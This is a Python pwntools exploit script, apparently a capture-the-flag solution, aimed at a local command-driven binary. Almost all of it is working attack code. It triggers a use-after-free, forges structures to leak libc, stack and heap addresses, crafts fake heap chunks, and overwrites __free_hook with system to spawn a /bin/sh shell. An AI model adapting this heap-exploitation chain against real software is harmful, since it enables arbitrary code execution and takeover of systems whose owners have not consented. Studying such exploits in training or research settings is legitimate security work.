#coding=utf-8
from pwn import *
local = 1
exec_file="./debug"
#exec_file="./prob"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x00000000004064FB
    b *0x000000000402CFA
    b *0x0000000000407590
    b *0x000000000407623
    b *0x0000000000402CB6
    b *0x4067d2
    b *0x0000000000405509
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))

def send(payload):
    a.sendline(payload)

def comment(size,payload):
    a.recvuntil("size:\n")
    a.sendline(str(size))
    a.recvuntil("comment:")
    a.send(payload)

def getUAF():
    a.recvuntil(">")
    send("begin")
    a.recvuntil(">")
    send("integer function add();")
    a.recvuntil(">>>")
    send("end")
    a.recvuntil(">")
    send("OVER")

read_got = 0x000000000610058


getUAF()

payload = p64(read_got)
payload += p64(0)*3    # securt[4]
payload += p64(0) #vars
payload += p64(read_got)#string ptr
payload += p64(1) #string length
payload += p64(0) + p64(0) #padding
payload += p32(0) #level
payload += p32(0) #position

comment(0x58,payload)

a.recvuntil("vadr : 1\n")
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["read"]
fuck(libc_base)
a.recvuntil("continue ? \n")
a.sendline("y")


#debug()
getUAF()

environ_addr = libc_base+libc.symbols["environ"]
payload = p64(environ_addr)
payload += p64(0)*3    # securt[4]
payload += p64(0) #vars
payload += p64(environ_addr)#string ptr
payload += p64(1) #string length
payload += p64(0) + p64(0) #padding
payload += p32(0) #level
payload += p32(0) #position
comment(0x58,payload)
a.recvuntil("vadr : 1\n")
stack_addr=u64(a.recv(6)+'\x00\x00')
fuck(stack_addr)
a.recvuntil("continue ? \n")
a.sendline("y")


getUAF()

fake_ptr = stack_addr-0x2c0 #5c0
fuck(fake_ptr)

payload = p64(environ_addr)
payload += p64(0)*3    # securt[4]
payload += p64(fake_ptr) #vars
payload += '\x98'#string ptr

comment(0x58,payload)
a.recvuntil("Process\nname : ")
heap_addr = u64(a.recvuntil("\n",drop=True).ljust(8,'\x00'))
fuck(heap_addr)
a.recvuntil("continue ? \n")
a.sendline("y")



# fake vars 

a.recvuntil(">")
send("OVER")

fakevars_addr = heap_addr+0xd28
fuck(fakevars_addr)

payload = p64(fakevars_addr+0x10)
payload += p64(8)
payload += 'backdoor'
payload += p64(0)
payload += p64(fakevars_addr+10*8+0x10)  # backdoor will free the ptr
payload += p64(fakevars_addr+7*8)
payload += p64(8)
payload += 'backdoor'
payload += p64(0)
payload += p64(0) # level position

payload += p64(0)+p64(0x31)#fake chunk
payload += 'A'*0x20
payload += p64(0)+p64(0x21)
payload += p64(fakevars_addr)*2


comment(0x198,payload)
a.recvuntil("continue ? \n")
a.sendline("y")


getUAF()

payload = p64(environ_addr)
payload += p64(0)*3    # securt[4]
payload += p64(fakevars_addr+18*8) #vars
payload += p64(environ_addr)#string ptr
payload += p64(1) #string length
payload += p64(0) + p64(0) #padding
payload += p32(0) #level
payload += p32(2) #position
#debug()
comment(0x58,payload)
a.recvuntil("continue ? \n")
a.sendline("y")

#debug()

a.recvuntil(">")
send("OVER")

__free_hook=libc_base+libc.symbols["__free_hook"]
comment(0x28,p64(__free_hook-8))
a.recvuntil("continue ? \n")
a.sendline("y")

a.recvuntil(">")
send("OVER")
comment(0x28,p64(__free_hook-8))
a.recvuntil("continue ? \n")
a.sendline("y")

#debug()
a.recvuntil(">")
send("OVER")
comment(0x28,"/bin/sh\x00"+p64(libc.symbols["system"]+libc_base))
a.recvuntil("continue ? \n")
a.sendline("NO")

a.interactive()


